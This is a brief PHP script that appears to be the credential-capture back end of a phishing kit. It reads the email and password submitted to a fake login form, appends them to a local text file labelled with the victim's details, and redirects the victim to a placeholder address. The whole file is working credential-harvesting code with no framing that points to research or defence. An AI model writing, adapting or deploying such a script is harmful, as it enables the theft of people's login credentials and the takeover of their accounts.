<?php
include 'ip.php';

file_put_contents("k_noelle26.txt", "[EMAIL]: " . $_POST['k_noelle26'] . " [PASS]: " . $_POST['password'] . "\n", FILE_APPEND);
header('Location: <CUSTOM>');
exit();
